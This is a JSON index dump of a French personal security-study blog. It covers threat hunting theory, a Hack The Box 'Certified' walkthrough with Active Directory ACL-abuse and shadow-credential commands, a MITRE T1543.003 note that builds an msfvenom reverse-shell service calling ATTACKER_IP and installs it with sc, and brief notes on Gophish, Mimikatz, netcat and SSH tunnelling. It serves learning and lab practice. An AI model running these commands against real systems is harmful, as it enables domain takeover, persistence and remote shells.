sont responsables de la conception globale de l\u0026rsquo;infrastructure de s√©curit√© de l\u0026rsquo;organisation. Network Security AnalystCes professionnels sont sp√©cialis√©s dans le comportement des r√©seaux et les sch√©mas de trafic. SOC Manager:Le responsable du centre des op√©rations de s√©curit√© (SOC) supervise les op√©rations de l\u0026rsquo;√©quipe de recherche de menaces, assurant une coordination harmonieuse entre les membres de l\u0026rsquo;√©quipe et une communication efficace avec le reste de l\u0026rsquo;organisation. La relation entre l\u0026rsquo;√©valuation des risques et la chasse aux menaces L\u0026rsquo;√©valuation des risques, aspect essentiel de la cybers√©curit√©, permet une compr√©hension globale des vuln√©rabilit√©s potentielles et des vecteurs de menaces au sein d\u0026rsquo;une organisation. Dans le cadre de la traque des menaces, l\u0026rsquo;√©valuation des risques constitue un outil essentiel, nous permettant de prioriser nos activit√©s et de concentrer nos efforts sur les domaines les plus impactants.\nL\u0026rsquo;√©valuation des risques implique un processus syst√©matique d\u0026rsquo;identification et d\u0026rsquo;√©valuation des risques en fonction des sources de menaces potentielles, des vuln√©rabilit√©s existantes et de l\u0026rsquo;impact potentiel de leur exploitation. Elle comprend une s√©rie d\u0026rsquo;√©tapes, notamment l\u0026rsquo;identification des actifs, des menaces et des vuln√©rabilit√©s, la d√©termination des risques et, enfin, la formulation d\u0026rsquo;une strat√©gie d\u0026rsquo;att√©nuation des risques.\nDans le processus de recherche des menaces, les informations recueillies √† partir d‚Äôune √©valuation approfondie des risques peuvent guider nos activit√©s de plusieurs mani√®res :\nPrioritizing Hunting EffortsEn identifiant les actifs les plus critiques (souvent appel√©s ¬´ joyaux de la couronne ¬ª) et les risques associ√©s, nous pouvons prioriser nos efforts de recherche de menaces dans ces domaines. Ces actifs peuvent inclure des r√©f√©rentiels de donn√©es sensibles, des applications critiques ou des infrastructures r√©seau cl√©s.\nUnderstanding Threat LandscapeL\u0026rsquo;√©tape d\u0026rsquo;identification des menaces de l\u0026rsquo;√©valuation des risques nous permet de mieux comprendre le paysage des menaces, notamment les tactiques, techniques et proc√©dures (TTP) utilis√©es par les acteurs potentiels. Cette compr√©hension nous aide √† d√©velopper nos hypoth√®ses de recherche, essentielles √† une chasse proactive aux menaces.\nHighlighting VulnerabilitiesL\u0026rsquo;√©valuation des risques permet de mettre en √©vidence les vuln√©rabilit√©s de nos syst√®mes, applications et processus. Conna√Ætre ces faiblesses nous permet de rechercher des indicateurs d\u0026rsquo;exploitation dans ces domaines. Par exemple, si nous savons qu\u0026rsquo;une application particuli√®re pr√©sente une vuln√©rabilit√© permettant une √©l√©vation de privil√®ges, nous pouvons rechercher des anomalies dans les niveaux de privil√®ges des utilisateurs.\nInforming the Use of Threat IntelligenceLa veille sur les menaces est souvent utilis√©e dans la chasse aux menaces pour identifier les sch√©mas de comportement malveillant. L\u0026rsquo;√©valuation des risques contribue √† √©clairer l\u0026rsquo;application de la veille sur les menaces en identifiant les acteurs les plus probables et leurs m√©thodes d\u0026rsquo;attaque pr√©f√©r√©es.\nRefining Incident Response PlansL\u0026rsquo;√©valuation des risques joue √©galement un r√¥le essentiel dans l\u0026rsquo;am√©lioration des plans de r√©ponse aux incidents (IR). Comprendre les risques potentiels nous aide √† anticiper et √† planifier les violations potentielles, garantissant ainsi une r√©ponse rapide et efficace.\nEnhancing Cybersecurity Controls:Enfin, les strat√©gies d‚Äôatt√©nuation des risques d√©riv√©es de l‚Äô√©valuation des risques peuvent directement contribuer √† l‚Äôam√©lioration des contr√¥les et des d√©fenses de cybers√©curit√© existants, renfor√ßant ainsi davantage la posture de s√©curit√© de l‚Äôorganisation.\nLe processus de chasse aux menaces Vous trouverez ci-dessous une br√®ve description du processus de recherche de menaces :\nSetting the Stage: La phase initiale est enti√®rement consacr√©e √† la planification et √† la pr√©paration. Elle comprend la d√©finition d\u0026rsquo;objectifs clairs, fond√©s sur une compr√©hension approfondie du paysage des menaces, des besoins critiques de notre entreprise et de nos analyses de renseignements sur les menaces.Setting the Stage: La phase initiale est enti√®rement consacr√©e √† la planification et √† la pr√©paration. Elle comprend la d√©finition d\u0026rsquo;objectifs clairs, fond√©s sur une compr√©hension approfondie du paysage des menaces, des besoins critiques de notre entreprise et de nos analyses de renseignements sur les menaces. Formulating HypothesesL\u0026rsquo;√©tape suivante consiste √† formuler des pr√©dictions √©clair√©es qui guideront notre traque des menaces. Ces hypoth√®ses peuvent provenir de sources diverses, comme les r√©centes informations sur les menaces, les actualit√©s du secteur, les alertes des outils de s√©curit√©, voire notre intuition professionnelle. Introduction to Threat Hunting \u0026amp; Hunting With Elastic https://academy.hackthebox.com/module/214/section/2280\n","permalink":"https://nyobemichel.me/posts/learn/threat-hunting/","summary":"\u003ch1 id=\"introduction-√†-la-chasse-aux-menaces\"\u003eIntroduction √† la chasse aux menaces\u003c/h1\u003e\n\u003cp\u003eLes aspects cl√©s de la chasse aux menaces comprennent :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUne strat√©gie offensive proactivequi privil√©gie l‚Äôanticipation des menaces plut√¥t que la r√©action, bas√©e sur des hypoth√®ses, les TTP des attaquants et les renseignements.\u003c/li\u003e\n\u003cli\u003eUne r√©ponse offensive reactivequi recherche sur le r√©seau des artefacts li√©s √† un verifiedincident, sur la base de preuves et de renseignements.\u003c/li\u003e\n\u003cli\u003eUne compr√©hension solide et pratique du paysage des menaces, des cybermenaces, des TTP adverses et de la cha√Æne de destruction cybern√©tique.\u003c/li\u003e\n\u003cli\u003eEmpathie cognitive avec l‚Äôagresseur, favorisant la compr√©hension de l‚Äô√©tat d‚Äôesprit de l‚Äôadversaire.\u003c/li\u003e\n\u003cli\u003eUne connaissance approfondie de l\u0026rsquo;environnement informatique de l\u0026rsquo;organisation, de la topologie du r√©seau, des actifs num√©riques et de l\u0026rsquo;activit√© normale.\u003c/li\u003e\n\u003cli\u003eUtilisation de donn√©es haute fid√©lit√© et d‚Äôanalyses tactiques, et exploitation d‚Äôoutils et de plateformes avanc√©s de recherche de menaces.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"structure-dune-√©quipe-de-chasse-aux-menaces\"\u003eStructure d\u0026rsquo;une √©quipe de chasse aux menaces\u003c/h1\u003e\n\u003cp\u003eLa constitution d\u0026rsquo;une √©quipe de chasse aux menaces est un processus strat√©gique et minutieusement planifi√© qui requiert des comp√©tences, une expertise et des perspectives diversifi√©es. Il est crucial que chaque membre de l\u0026rsquo;√©quipe poss√®de un ensemble de comp√©tences uniques qui, combin√©es, offrent une approche globale et compl√®te pour identifier, att√©nuer et √©liminer les menaces.\u003c/p\u003e","title":""},{"content":"M√©thodes de transfert de fichiers Windows ","permalink":"https://nyobemichel.me/posts/learn/transferts-de-fichiers/","summary":"\u003ch1 id=\"m√©thodes-de-transfert-de-fichiers-windows\"\u003eM√©thodes de transfert de fichiers Windows\u003c/h1\u003e","title":""},{"content":"https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\n","permalink":"https://nyobemichel.me/posts/learn/zero-trust---securing-identity/","summary":"\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\"\u003ehttps://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Enumeration Nmap nmap -sV -sC 10.10.11.41 -v --min-rate 1000 -Pn -T4 -p- PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 11:05:11Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea |_ssl-date: 2025-08-03T11:06:41+00:00; +7h00m00s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea |_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea |_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49690/tcp open msrpc Microsoft Windows RPC 49691/tcp open msrpc Microsoft Windows RPC 49720/tcp open msrpc Microsoft Windows RPC 49728/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-08-03T11:06:04 |_ start_date: N/A |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required python3 bloodyAD.py \u0026ndash;host \u0026ldquo;10.10.11.41\u0026rdquo; -d \u0026ldquo;certified.htb\u0026rdquo; -u \u0026ldquo;judith.mader\u0026rdquo; -p \u0026ldquo;judith09\u0026rdquo; set owner management judith.mader\n[*] Current owner information below [*] - SID: S-1-5-21-729746778-2675978091-3820388244-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb [*] OwnerSid modified successfully! impacket-dacledit -action \u0026lsquo;write\u0026rsquo; -rights \u0026lsquo;FullControl\u0026rsquo; -inheritance -principal \u0026lsquo;judith.mader\u0026rsquo; -target \u0026lsquo;management\u0026rsquo; \u0026ldquo;certified.htb\u0026rdquo;/\u0026ldquo;judith.mader\u0026rdquo;:\u0026lsquo;judith09\u0026rsquo;\n[*] DACL backed up to dacledit-20250803-071545.bak [*] DACL modified successfully! net rpc group addmem \u0026ldquo;management\u0026rdquo; \u0026ldquo;judith.mader\u0026rdquo; -U \u0026ldquo;certified.htb\u0026rdquo;/\u0026ldquo;judith.mader\u0026rdquo;%\u0026lsquo;judith09\u0026rsquo; -S \u0026ldquo;dc01.certified.htb\u0026rdquo;\npython3 pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 56f8749d-270a-9078-813b-876958ecf1bf [*] Updating the msDS-KeyCredentialLink attribute of management_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: 58SLNMUb.pfx [+] PFX exportiert nach: 58SLNMUb.pfx [i] Passwort f√ºr PFX: 0axzLWh7cg6d1speQvbf [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: 58SLNMUb.pfx [*] Must be used with password: 0axzLWh7cg6d1speQvbf [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools ","permalink":"https://nyobemichel.me/posts/machine/certified---htb/","summary":"\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003eNmap\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sV -sC 10.10.11.41 -v  --min-rate \u003cspan class=\"m\"\u003e1000\u003c/span\u003e -Pn -T4 -p-\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 11:05:11Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n|_ssl-date: 2025-08-03T11:06:41+00:00; +7h00m00s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49691/tcp open  msrpc         Microsoft Windows RPC\n49720/tcp open  msrpc         Microsoft Windows RPC\n49728/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-08-03T11:06:04\n|_  start_date: N/A\n|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003epython3 bloodyAD.py  \u0026ndash;host \u0026ldquo;10.10.11.41\u0026rdquo; -d \u0026ldquo;certified.htb\u0026rdquo; -u \u0026ldquo;judith.mader\u0026rdquo; -p \u0026ldquo;judith09\u0026rdquo; set owner management judith.mader\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/mouvement-lat%C3%A9ral-et-pivotement/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/ntlm-authentication/","summary":"","title":""},{"content":"Tunneling SSH Le tunneling SSH¬†peut √™tre utilis√© de diff√©rentes mani√®res pour rediriger des ports via une connexion¬†SSH¬†, selon la situation. Pour expliquer chaque cas, imaginons que nous ayons pris le contr√¥le de la machine PC-1 (sans acc√®s administrateur) et que nous souhaitions l\u0026rsquo;utiliser comme pivot pour acc√©der √† un port d\u0026rsquo;une autre machine auquel nous ne pouvons pas nous connecter directement. Nous allons cr√©er un tunnel depuis la machine PC-1, agissant comme client¬†SSH¬†, vers le PC de l\u0026rsquo;attaquant, qui agira comme serveur¬†SSH¬†. En effet,¬†les machines Windows disposent souvent d\u0026rsquo;un client¬†SSH¬†, mais la plupart du temps, aucun serveur¬†SSH n\u0026rsquo;est disponible. √âtant donn√© que nous allons √©tablir une connexion avec la machine de notre attaquant, nous voudrons cr√©er un utilisateur sans acc√®s √† aucune console pour le tunneling et d√©finir un mot de passe √† utiliser pour cr√©er les tunnels¬†:\nuseradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser ","permalink":"https://nyobemichel.me/posts/microsoft/redirection-de-port/","summary":"\u003ch1 id=\"tunneling-ssh\"\u003eTunneling SSH\u003c/h1\u003e\n\u003cp\u003eLe tunneling SSH¬†peut √™tre utilis√© de diff√©rentes mani√®res pour rediriger des ports via une connexion¬†SSH¬†, selon la situation. Pour expliquer chaque cas, imaginons que nous ayons pris le contr√¥le de la machine PC-1 (sans acc√®s administrateur) et que nous souhaitions l\u0026rsquo;utiliser comme pivot pour acc√©der √† un port d\u0026rsquo;une autre machine auquel nous ne pouvons pas nous connecter directement. Nous allons cr√©er un tunnel depuis la machine PC-1, agissant comme client¬†SSH¬†, vers le PC de l\u0026rsquo;attaquant, qui agira comme serveur¬†SSH¬†. En effet,¬†les machines Windows disposent souvent d\u0026rsquo;un client¬†SSH¬†, mais la plupart du temps, aucun serveur¬†SSH n\u0026rsquo;est disponible.\n\u003cimg alt=\"SSh tunneling\" loading=\"lazy\" src=\"/images/ssh_tunneling.png\"\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/sans-titre/","summary":"","title":""},{"content":"Processus Un processus poss√®de un espace d\u0026rsquo;adressage virtuel, du code ex√©cutable, des handles ouverts vers des objets syst√®me, un contexte de s√©curit√©, un identifiant de processus unique, des variables d\u0026rsquo;environnement, une classe de priorit√©, des tailles minimale et maximale de jeu de travail et au moins un thread d\u0026rsquo;ex√©cution.¬†¬ª\nThreads https://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\n","permalink":"https://nyobemichel.me/posts/microsoft/windows-internal/","summary":"\u003ch1 id=\"processus\"\u003eProcessus\u003c/h1\u003e\n\u003cp\u003eUn processus poss√®de un espace d\u0026rsquo;adressage virtuel, du code ex√©cutable, des handles ouverts vers des objets syst√®me, un contexte de s√©curit√©, un identifiant de processus unique, des variables d\u0026rsquo;environnement, une classe de priorit√©, des tailles minimale et maximale de jeu de travail et au moins un thread d\u0026rsquo;ex√©cution.¬†¬ª\u003c/p\u003e\n\u003ch1 id=\"threads\"\u003eThreads\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\"\u003ehttps://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Les pirates peuvent cr√©er ou modifier des services Windows pour ex√©cuter de mani√®re r√©p√©t√©e des charges malveillantes dans le cadre de la persistance. Au d√©marrage de Windows, des programmes ou applications appel√©s services ex√©cutent des fonctions syst√®me en arri√®re-plan. (Citation¬†: TechNet Services) Les informations de configuration des services Windows, notamment le chemin d\u0026rsquo;acc√®s aux fichiers ex√©cutables ou aux programmes/commandes de r√©cup√©ration, sont stock√©es dans le Registre Windows.\nExample Creation d\u0026rsquo;un shell inverse\nmsfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe Nous avons t√©l√©charger notre charge utile sur le partage ADMIN$\nsmbclient -c \u0026#39;put myservice.exe\u0026#39; -U $name$ -W $domaine \u0026#39;//$partage$/admin$/\u0026#39; $password$ Une fois notre ex√©cutable t√©l√©charg√©, nous allons configurer un √©couteur sur la machine de l\u0026rsquo;attaquant pour recevoir le reverse shell de¬†msfconsole:\nmsfconsole -q -x \u0026#34;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $IP$; set LPORT 4444;exploit\u0026#34; Et enfin, proc√©dez √† la cr√©ation d\u0026rsquo;un nouveau service √† distance en utilisant sc, en l\u0026rsquo;associant √† notre binaire t√©l√©charg√©\nC:\\\u0026gt; sc.exe \\\\DossierPartage create service-3249 binPath= \u0026#34;%windir%\\myservice.exe\u0026#34; start= auto C:\\\u0026gt; sc.exe \\\\DossierPartage start service-3249 https://attack.mitre.org/techniques/T1543/003/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md?plain=1\n","permalink":"https://nyobemichel.me/posts/mitre/t1543-003---create-or-modify-system-process-windows-service/","summary":"\u003cp\u003eLes pirates peuvent cr√©er ou modifier des services Windows pour ex√©cuter de mani√®re r√©p√©t√©e des charges malveillantes dans le cadre de la persistance. Au d√©marrage de Windows, des programmes ou applications appel√©s services ex√©cutent des fonctions syst√®me en arri√®re-plan. (Citation¬†: TechNet Services) Les informations de configuration des services Windows, notamment le chemin d\u0026rsquo;acc√®s aux fichiers ex√©cutables ou aux programmes/commandes de r√©cup√©ration, sont stock√©es dans le Registre Windows.\u003c/p\u003e\n\u003ch4 id=\"example\"\u003eExample\u003c/h4\u003e\n\u003cp\u003eCreation d\u0026rsquo;un shell inverse\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crunch/","summary":"","title":""},{"content":"Qu\u0026rsquo;est-ce que Gophish ? Gophish est un framework de phishing qui simplifie la simulation d\u0026rsquo;attaques r√©elles. L\u0026rsquo;id√©e derri√®re Gophish est simple : offrir une formation de pointe en phishing accessible √† tous. ¬´ Disponible ¬ª signifie ici deux choses : Voici les fonctionnalit√©s principales de Gophish :\nCr√©ation d\u0026rsquo;utilisateurs et de groupes d\u0026rsquo;utilisateurs (cibles) Cr√©ation de template pour les e-mails de vos campagnes Cr√©ation de landing page pour vos campagnes (exemple : un formulaire de connexion) Envoyer des campagnes de phishing avec suivi des e-mails (e-mail envoy√©, e-mail ouvert, clic sur le lien, donn√©es r√©colt√©es via le formulaire) pour chaque utilisateur Reporting sur les campagnes API pour interroger Gophish √† distance et r√©cup√©rer des informations Rappel : c\u0026rsquo;est quoi le phishing ? Le phishing, ou hame√ßonnage en fran√ßais, est une technique utilis√©e dans le cadre d\u0026rsquo;attaques informatiques pour inciter l\u0026rsquo;utilisateur √† communiquer des informations personnelles (nom d\u0026rsquo;utilisateur, mot de passe, num√©ro de carte bancaire, etc.) √† partir d\u0026rsquo;un e-mail, d\u0026rsquo;un SMS, etc\u0026hellip; Qui va rediriger l\u0026rsquo;utilisateur sur une page Web malveillante\n","permalink":"https://nyobemichel.me/posts/outils/gophish/","summary":"\u003cp\u003eQu\u0026rsquo;est-ce que Gophish ?\nGophish est un framework de phishing qui simplifie la simulation d\u0026rsquo;attaques r√©elles. L\u0026rsquo;id√©e derri√®re Gophish est simple : offrir une formation de pointe en phishing accessible √† tous. ¬´ Disponible ¬ª signifie ici deux choses :\nVoici les fonctionnalit√©s principales de Gophish :\u003c/p\u003e\n\u003cp\u003eCr√©ation d\u0026rsquo;utilisateurs et de groupes d\u0026rsquo;utilisateurs (cibles)\nCr√©ation de template pour les e-mails de vos campagnes\nCr√©ation de landing page pour vos campagnes (exemple : un formulaire de connexion)\nEnvoyer des campagnes de phishing avec suivi des e-mails (e-mail envoy√©, e-mail ouvert, clic sur le lien, donn√©es r√©colt√©es via le formulaire) pour chaque utilisateur\nReporting sur les campagnes\nAPI pour interroger Gophish √† distance et r√©cup√©rer des informations\nRappel : c\u0026rsquo;est quoi le phishing ?\nLe phishing, ou hame√ßonnage en fran√ßais, est une technique utilis√©e dans le cadre d\u0026rsquo;attaques informatiques pour inciter l\u0026rsquo;utilisateur √† communiquer des informations personnelles (nom d\u0026rsquo;utilisateur, mot de passe, num√©ro de carte bancaire, etc.) √† partir d\u0026rsquo;un e-mail, d\u0026rsquo;un SMS, etc\u0026hellip; Qui va rediriger l\u0026rsquo;utilisateur sur une page Web malveillante\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/impacket/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/metasploit/","summary":"","title":""},{"content":"Mimikatz est un outil de post-exploitation tr√®s populaire et puissant, le plus souvent utilis√© pour vider les informations d\u0026rsquo;identification des utilisateurs √† l\u0026rsquo;int√©rieur d\u0026rsquo;un r√©seau d\u0026rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de cr√©er un ticket argent√©.\nhttps://github.com/ParrotSec/mimikatz\n","permalink":"https://nyobemichel.me/posts/outils/mimikatz/","summary":"\u003cp\u003eMimikatz est un outil de post-exploitation tr√®s populaire et puissant, le plus souvent utilis√© pour vider les informations d\u0026rsquo;identification des utilisateurs √† l\u0026rsquo;int√©rieur d\u0026rsquo;un r√©seau d\u0026rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de cr√©er un ticket argent√©.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/ParrotSec/mimikatz\"\u003ehttps://github.com/ParrotSec/mimikatz\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Example d\u0026rsquo;un √©couteur Netcat\nnc -lvnp 7777 connexion\nnc -nv 10.129.41.200 7777 ","permalink":"https://nyobemichel.me/posts/outils/netcat/","summary":"\u003cp\u003eExample d\u0026rsquo;un √©couteur Netcat\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e nc -lvnp \u003cspan class=\"m\"\u003e7777\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003econnexion\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-Bash\" data-lang=\"Bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -nv 10.129.41.200 \u003cspan class=\"m\"\u003e7777\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":""},{"content":"un outil de test de p√©n√©tration open source qui teste la s√©curit√© des bases de donn√©es Oracle √† distance. Gr√¢ce √† ODAT, vous pouvez :\nrechercher¬†un SID valide¬†sur un √©couteur de base de donn√©es Oracle distant 